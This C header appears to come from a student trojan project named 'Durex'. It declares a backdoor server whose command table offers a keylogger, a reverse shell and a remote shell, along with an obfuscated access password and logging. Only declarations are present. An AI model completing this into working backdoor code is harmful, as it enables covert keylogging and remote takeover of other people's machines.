/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
/*   Updated: 2019/08/06 00:56:34 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

/* memset strcpy */
# include <string.h>
/* select */
# include <sys/time.h>
# include <sys/types.h>
# include <unistd.h>
/* NI_MAXHOST ... */
# include <sys/socket.h>
# include <netdb.h>

# define SERVER_REPORTER	"/var/log/Durex.log"
# define SERVER_PORT		"4242"
# define SERVER_REMOTE_PORT	"2121"
# define SERVER_KEYLOG_PORT "1212"
# define SERVER_CLIENT_MAX	3
# define SERVER_CLIENT_BUFF	128
# define SERVER_COMMANDS	{ "?"     , NULL     , "Display this help."      , serverHelp       , NULL },\
							{ "log"   , "[clear]", "Print logs or clear them", serverPrintLogs  , NULL },\
							{ "stat"  , NULL     , "Print server status"     , serverPrintStats , NULL },\
							{ "keylog", "[port]" , "Open a keylogger."       , serverKeylogger  , NULL },\
							{ "rshell", "[port]" , "Open a reverse shell."   , serverRemoteShell, NULL },\
							{ "shell" , NULL     , "Open a shell."           , serverShell      , NULL },\
							{ "quit"  , NULL     , "Quit server."            , serverQuitClient , NULL },
# define SERVER_PASS		201, 121, 30, 74, 3, 83, 154, 250 /* kata */

typedef struct	s_uptime
{
	char		*str;
	int			revolution;
}				t_uptime;

typedef struct	s_buff
{
	char		buff[SERVER_CLIENT_BUFF];
	char		*head;
	char		*tail;
}				t_buff;

typedef struct	s_cl
{
	int			id;
	int			fd;
	int			shell;
	char		addr[17];
	char		host[NI_MAXHOST + 1];
	char		port[NI_MAXSERV + 1];
	int			logged;
	t_buff		rd;
	t_buff		wr;
}				t_cl;

typedef struct	s_sv
{
	int				reporter;
	pthread_mutex_t	mutex;
	int				fd;
	fd_set			fdr;
	fd_set			fdw;
	t_cl			client[SERVER_CLIENT_MAX];
	time_t			uptime;
}				t_sv;

typedef struct	s_cmd
{
	char		*name;
	char		*options;
	char		*def;
	void		(*func)(t_cl *, struct s_cmd *);
	char		*opt;
}				t_cmd;

void			print_usr_name();
int				create_library();

int				openServer(const char *addr, const char *port);
void			serverAcceptConnections();
void			serverReadClient(t_cl *client);
void			serverWriteClient(t_cl *client);
void			serverCommands(t_cl *client);
void			serverHelp(t_cl *client, t_cmd *cmds);
void			serverShell(t_cl *client, t_cmd *cmds);
int				spawnShell();
void			serverReadClientShell(t_cl *client);
void			serverQuitClientShell(t_cl *client, t_cmd *cmds);
void			serverRemoteShell(t_cl *client, t_cmd *cmds);
int				serverConnectShell(t_cl *client, char *port);
void			serverKeylogger(t_cl *client, t_cmd *cmds);
int				serverInitKeylogger(int socket);
void			serverPrintLogs(t_cl *client, t_cmd *cmds);
void			serverClearLogs(t_cl *client);
void			serverPrintStats(t_cl *client, t_cmd *cmds);
void			serverQuitClient(t_cl *client, t_cmd *cmds);
void			quitClearlyServer();
void			clearClient(t_cl *client);
void			serverShellSpawned(char *buff, t_cl *client);

void			clientRead(char *buff, int size, t_cl *client);
void			clientWrite(const char *str, t_cl *client);
void			clientShell(int fds);

int				hireReporter();
void			serverLog(int ts, const char *message, ...);

void			encryptFunction(unsigned char *msg, size_t size);
char			*moveTail(char *ptr, char *buff, int buff_size);

int				mystrlen(const char *s1);
void			*mymemset(void *s, int c, unsigned int n);
int				mystrcmp(const char *s1, const char *s2);
char			*myitoa(int n);
char			**mysplitwhitespaces(char const *s);
void			mytabdel(char ***tab);

void			durexSigterm(int sig);

#endif /* DUREX_H */
